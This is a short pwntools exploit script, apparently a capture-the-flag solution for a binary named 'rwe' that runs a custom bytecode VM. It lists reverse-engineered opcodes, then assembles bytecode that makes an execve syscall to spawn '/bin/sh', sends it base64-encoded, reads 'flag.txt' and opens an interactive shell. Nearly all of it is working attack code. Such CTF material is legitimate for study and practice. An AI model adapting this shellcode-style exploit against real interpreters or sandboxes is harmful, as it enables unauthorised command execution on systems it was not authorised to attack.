from pwn import *
from base64 import b64encode

r = process("./rwe")
'''
DE: pop regX (2 bytes)
DF: push regX (2 bytes)
DD: push imm32 (5 bytes)
11: jeq imm32 (? - 5 bytes)
12: jne imm32 (? - 5 bytes)
19: mov regX, code_base + imm32 (6 bytes)
1f: jmp regX (2 bytes)
20: mov regY, regX (2 bytes, Y and X in 1 byte)
21: mov regX, [code + imm32] (6 bytes)
22: mov regX, [code + imm32] (same as 21? - 6 bytes)
23: mov [code + imm32], regX (6 bytes)
30: add regX, imm32 (6 bytes)
35: add reg0, regX (2 bytes)
40: xor regY, regX (2 bytes, Y and X in 1 byte)
50: sub regX, imm32 (6 bytes)
51: sub reg0, regX (2 bytes)
60: geq regY, regX (2 bytes, Y and X in 1 byte)
61: leq regY, regX (2 bytes, Y and X in 1 byte)
80: syscall reg0(reg1, reg2, reg3) (1 byte)
81: call memcpy (?)
82: call something (?)
90: exit
'''

code = b"\xDD" + p32(0x0b) # push 0x0b - execve
code += b"\xDE\x00" # pop reg0
code += b"\x19\x01" + p32(0x1c) # mov reg1, code_base + 0x1c
code += b"\xDD" + p32(0x00) # push 0x00
code += b"\xDE\x02" # pop reg2
code += b"\xDD" + p32(0x00) # push 0x00
code += b"\xDE\x03" # pop reg3
code += b"\x80" #syscall
code += b"/bin/sh\0"

r.sendlineafter(b"Input command: ", b64encode(code))
r.sendline(b"cat ./flag.txt")

r.interactive()
